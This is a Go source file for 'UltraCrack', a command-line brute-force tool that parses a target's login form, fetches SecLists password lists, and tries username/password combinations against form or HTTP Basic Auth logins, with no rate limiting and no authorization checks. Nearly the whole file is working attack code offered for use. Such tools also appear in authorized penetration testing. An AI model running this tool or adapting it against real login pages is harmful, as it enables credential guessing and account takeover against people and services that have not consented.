package main

import (
	"bufio"
	"flag"
	"fmt"
	"io"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"golang.org/x/net/html"
)

const version = "3.2.7"

var (
	secListsRepoBase = "https://raw.githubusercontent.com/danielmiessler/SecLists/master"
	commonPassList   = "/Passwords/Common-Credentials/10-million-password-list-top-10000.txt"
	commonUserList   = "/Usernames/top-usernames-shortlist.txt"
)

func printBanner() {
	fmt.Println("UltraCrack (part of Lucas Kit) is made by Lucas Mangroelal | lucasmangroelal.nl")
}

type options struct {
	url         string
	analyze     bool
	username    string
	userList    string
	password    string
	passList    string
	method      string
	userField   string
	passField   string
	failText    string
	successText string
	dlSecLists  bool
	help        bool
	version     bool
	verbose     bool
}

func main() {
	var o options

	flag.StringVar(&o.url, "url", "", "Target URL (e.g. http://example.com/login)")
	flag.BoolVar(&o.analyze, "analyze", false, "Analyze the URL for form fields and suggest flags")

	flag.StringVar(&o.username, "u", "", "Single username")
	flag.StringVar(&o.userList, "ul", "", "Username list file")
	flag.StringVar(&o.password, "p", "", "Single password")
	flag.StringVar(&o.passList, "pl", "", "Password list file")

	flag.StringVar(&o.method, "m", "form", "Method: basic (HTTP Basic Auth) or form")
	flag.StringVar(&o.userField, "uf", "", "Form field name for username (e.g. 'email', 'user')")
	flag.StringVar(&o.passField, "pf", "", "Form field name for password (e.g. 'password', 'pwd')")

	flag.StringVar(&o.failText, "fail-text", "", "Text indicating failure (e.g. 'Invalid password')")
	flag.StringVar(&o.successText, "success-text", "", "Text indicating success (e.g. 'Welcome')")

	flag.BoolVar(&o.dlSecLists, "dl-seclists", false, "Download common SecLists to ~/.lucaskit/seclists")
	flag.BoolVar(&o.verbose, "v", false, "Verbose output")

	flag.BoolVar(&o.help, "help", false, "Show help")
	flag.BoolVar(&o.help, "h", false, "Show help (short)")
	flag.BoolVar(&o.version, "version", false, "Show version")

	flag.Usage = func() {
		printBanner()
		fmt.Fprintf(os.Stderr, "UltraCrack v%s - Brute Force Tool\n\n", version)
		fmt.Fprintf(os.Stderr, "Usage:\n")
		fmt.Fprintf(os.Stderr, "  ultracrack [flags]\n\n")
		fmt.Fprintf(os.Stderr, "Examples:\n")
		fmt.Fprintf(os.Stderr, "  ultracrack --analyze -url http://example.com/login\n")
		fmt.Fprintf(os.Stderr, "  ultracrack -u admin -pl top-10000.txt -url http://example.com/login -m form -uf user -pf pass -fail-text 'Incorrect'\n")
		fmt.Fprintf(os.Stderr, "Flags:\n")
		flag.PrintDefaults()
	}

	flag.Parse()

	if o.version {
		printBanner()
		fmt.Printf("Version: %s\n", version)
		os.Exit(0)
	}
	if o.help {
		flag.Usage()
		os.Exit(0)
	}

	if o.dlSecLists {
		if err := downloadSecLists(); err != nil {
			fmt.Printf("Error downloading SecLists: %v\n", err)
			os.Exit(1)
		}
		return
	}

	if o.url == "" {
		flag.Usage()
		os.Exit(2)
	}

	if o.analyze {
		runAnalyze(o.url)
		return
	}

	// Smart defaults for fields if not provided
	if o.method == "form" {
		if o.userField == "" {
			o.userField = "username" // safest default, but warn user
			fmt.Println("⚠️  Warning: No username field (-uf) provided. Defaulting to 'username'. Use --analyze to find exact name.")
		}
		if o.passField == "" {
			o.passField = "password"
			fmt.Println("⚠️  Warning: No password field (-pf) provided. Defaulting to 'password'. Use --analyze to find exact name.")
		}
	}

	runAttack(o)
}

func runAnalyze(targetURL string) {
	printBanner()
	fmt.Printf("🔍 Analyzing %s...\n", targetURL)

	resp, err := http.Get(targetURL)
	if err != nil {
		fmt.Printf("Error fetching URL: %v\n", err)
		return
	}
	defer resp.Body.Close()

	doc, err := html.Parse(resp.Body)
	if err != nil {
		fmt.Printf("Error parsing HTML: %v\n", err)
		return
	}

	var forms []*html.Node
	var crawler func(*html.Node)
	crawler = func(n *html.Node) {
		if n.Type == html.ElementNode && n.Data == "form" {
			forms = append(forms, n)
		}
		for c := n.FirstChild; c != nil; c = c.NextSibling {
			crawler(c)
		}
	}
	crawler(doc)

	if len(forms) == 0 {
		fmt.Println("❌ No <form> tags found on this page.")
		return
	}

	fmt.Printf("✅ Found %d form(s).\n\n", len(forms))

	for i, f := range forms {
		fmt.Printf("--- Form #%d ---\n", i+1)
		action := getAttr(f, "action")
		method := getAttr(f, "method")
		if method == "" {
			method = "GET"
		}
		fmt.Printf("Method: %s\n", method)
		fmt.Printf("Action: %s\n", action)

		inputs := findInputs(f)
		if len(inputs) > 0 {
			fmt.Println("Inputs found:")
			var uField, pField string
			for _, inp := range inputs {
				name := getAttr(inp, "name")
				typ := getAttr(inp, "type")
				id := getAttr(inp, "id")
				if name == "" {
					continue
				}

				fmt.Printf("  - Name: '%s' (Type: %s, ID: %s)\n", name, typ, id)

				// Guesses
				lower := strings.ToLower(name)
				if strings.Contains(lower, "user") || strings.Contains(lower, "login") || strings.Contains(lower, "email") {
					uField = name
				}
				if strings.Contains(lower, "pass") || strings.Contains(lower, "pwd") {
					pField = name
				}
			}

			if uField != "" && pField != "" {
				fmt.Printf("\n🚀 SUGGESTED COMMAND:\n")
				fmt.Printf("ultracrack -url %s -m form -uf %s -pf %s -u admin -pl top-10000.txt\n", targetURL, uField, pField)
			}
		} else {
			fmt.Println("  (No input fields with names found)")
		}
		fmt.Println()
	}
}

func findInputs(n *html.Node) []*html.Node {
	var inputs []*html.Node
	var crawler func(*html.Node)
	crawler = func(n *html.Node) {
		if n.Type == html.ElementNode {
			if n.Data == "input" {
				inputs = append(inputs, n)
			}
		}
		for c := n.FirstChild; c != nil; c = c.NextSibling {
			crawler(c)
		}
	}
	crawler(n)
	return inputs
}

func getAttr(n *html.Node, key string) string {
	for _, a := range n.Attr {
		if a.Key == key {
			return a.Val
		}
	}
	return ""
}

func runAttack(o options) {
	printBanner()
	fmt.Printf("🚀 Starting attack on %s\n", o.url)
	fmt.Printf("Method: %s\n", o.method)

	// Load users and passwords
	users := loadList(o.username, o.userList, "users")
	passwords := loadList(o.password, o.passList, "passwords")

	// Fallback to cache
	if len(passwords) == 0 && o.passList == "" {
		dir, _ := getStorageDir()
		defaultPass := filepath.Join(dir, "top-10000-passwords.txt")
		if _, err := os.Stat(defaultPass); err == nil {
			fmt.Println("ℹ️  Using cached top-10000-passwords.txt")
			lines, _ := readLines(defaultPass)
			passwords = append(passwords, lines...)
		}
	}

	if len(users) == 0 {
		users = []string{"admin"}
	} // Default to admin
	if len(passwords) == 0 {
		fmt.Println("❌ No passwords provided. Use -p, -pl, or --dl-seclists first.")
		os.Exit(1)
	}

	fmt.Printf("Loaded %d usernames and %d passwords.\n", len(users), len(passwords))
	fmt.Println("---------------------------------------------------")

	jar, _ := cookiejar.New(nil)
	client := &http.Client{
		Timeout: 10 * time.Second,
		Jar:     jar,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return nil // Follow redirects
		},
	}

	count := 0
	found := false

	for _, u := range users {
		for _, p := range passwords {
			if found {
				break
			}
			count++

			if o.verbose || count%10 == 0 {
				fmt.Printf("\r[%d] Trying %s:%s...      ", count, u, p)
			}

			success := false
			if o.method == "basic" {
				success = tryBasic(client, o.url, u, p)
			} else {
				success = tryForm(client, o.url, o.userField, o.passField, u, p, o.failText, o.successText)
			}

			if success {
				fmt.Printf("\n\n🎉 SUCCESS FOUND!\n")
				fmt.Printf("Username: %s\n", u)
				fmt.Printf("Password: %s\n", p)
				found = true
				break
			}

			// Small delay to be nice? No, this is UltraCrack.
		}
		if found {
			break
		}
	}

	if !found {
		fmt.Println("\n\n❌ Attack finished. No credentials found.")
	}
}

func tryBasic(client *http.Client, targetURL, user, pass string) bool {
	req, _ := http.NewRequest("GET", targetURL, nil)
	req.SetBasicAuth(user, pass)
	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()
	return resp.StatusCode == 200 || resp.StatusCode == 302
}

func tryForm(client *http.Client, targetURL, uField, pField, user, pass, failText, successText string) bool {
	vals := url.Values{}
	vals.Set(uField, user)
	vals.Set(pField, pass)

	resp, err := client.PostForm(targetURL, vals)
	if err != nil {
		return false
	}
	defer resp.Body.Close()

	bodyBytes, _ := io.ReadAll(resp.Body)
	body := string(bodyBytes)

	// Logic to determine success
	if failText != "" && strings.Contains(body, failText) {
		return false
	}
	if successText != "" && strings.Contains(body, successText) {
		return true
	}

	// Heuristic: If we get a 200 OK and no fail text, it might be a login page re-render (fail).
	// If we get a redirect (which client follows), we end up on a new page.
	// If the new page doesn't have the login form, maybe success?
	// This is hard to guess perfectly.

	// Default assumption: If failText is NOT provided, looking for 200 OK is weak.
	// Better heuristic: Check if we are redirected to a dashboard?

	// For now, if no text provided: check if status 200 and URL changed?
	// But redirects are followed.

	return false // Safe default if no indicators provided
}

func loadList(single, file, name string) []string {
	var list []string
	if single != "" {
		list = append(list, single)
	}
	if file != "" {
		lines, err := readLines(file)
		if err == nil {
			list = append(list, lines...)
		} else {
			fmt.Printf("Error reading %s list: %v\n", name, err)
		}
	}
	return list
}

func getStorageDir() (string, error) {
	home, err := os.UserHomeDir()
	if err != nil {
		return "", err
	}
	dir := filepath.Join(home, ".lucaskit", "seclists")
	if err := os.MkdirAll(dir, 0755); err != nil {
		return "", err
	}
	return dir, nil
}

func downloadSecLists() error {
	dir, err := getStorageDir()
	if err != nil {
		return err
	}

	fmt.Printf("Downloading SecLists to %s...\n", dir)

	files := map[string]string{
		"top-10000-passwords.txt": secListsRepoBase + commonPassList,
		"top-usernames.txt":       secListsRepoBase + commonUserList,
	}

	var wg sync.WaitGroup
	for name, url := range files {
		wg.Add(1)
		go func(name, url string) {
			defer wg.Done()
			dest := filepath.Join(dir, name)
			if _, err := os.Stat(dest); err == nil {
				fmt.Printf("  - %s already exists, skipping.\n", name)
				return
			}
			fmt.Printf("  - Downloading %s...\n", name)
			if err := downloadFile(dest, url); err != nil {
				fmt.Printf("    x Error downloading %s: %v\n", name, err)
			} else {
				fmt.Printf("    v Downloaded %s\n", name)
			}
		}(name, url)
	}
	wg.Wait()
	fmt.Println("Done!")
	return nil
}

func downloadFile(filepath string, url string) error {
	resp, err := http.Get(url)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("bad status: %s", resp.Status)
	}

	out, err := os.Create(filepath)
	if err != nil {
		return err
	}
	defer out.Close()

	_, err = io.Copy(out, resp.Body)
	return err
}

func readLines(path string) ([]string, error) {
	file, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" {
			lines = append(lines, line)
		}
	}
	return lines, scanner.Err()
}
